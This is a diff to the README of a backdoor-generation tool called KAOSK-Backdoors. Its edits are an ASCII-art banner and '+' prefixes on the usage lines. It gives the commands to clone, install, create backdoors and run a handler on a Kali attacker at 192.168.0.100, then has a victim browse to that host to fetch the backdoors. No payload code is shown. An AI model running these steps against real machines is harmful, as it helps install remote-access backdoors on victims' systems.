@@ -1,9 +1,16 @@
+
 >=>   >=>         >>           >===>        >=>>=>   >=>   >=>
+
 >=>  >=>         >>=>        >=>    >=>   >=>    >=> >=>  >=>
+
 >=> >=>         >> >=>     >=>        >=>  >=>       >=> >=>
+
 >>=>>          >=>  >=>    >=>        >=>    >=>     >>=>>
+
 >=>  >=>      >=====>>=>   >=>        >=>       >=>  >=>  >=>
+
 >=>   >=>    >=>      >=>    >=>     >=>  >=>    >=> >=>   >=>
+
 >=>     >=> >=>        >=>     >===>        >=>>=>   >=>     >=>
 
 # KAOSK-Backdoors
@@ -21,10 +28,10 @@ Using Kali2 as the attacker with IP: 192.168.0.100
 Using any machine as the victim in the same network as the attacker.
 
 Run in Kali:
-git clone https://github.com/carlospolop/KAOSK-backdoors.git
-python ./install.py
-python ./create_backdoors.py 192.168.0.100
-python ./handler.py 192.168.0.100
++ git clone https://github.com/carlospolop/KAOSK-backdoors.git
++ python ./install.py
++ python ./create_backdoors.py 192.168.0.100
++ python ./handler.py 192.168.0.100
 
 In the victim machine:
 Use a browser and navigate to 192.168.0.100/back and you will see the backdoors created before in the attacker
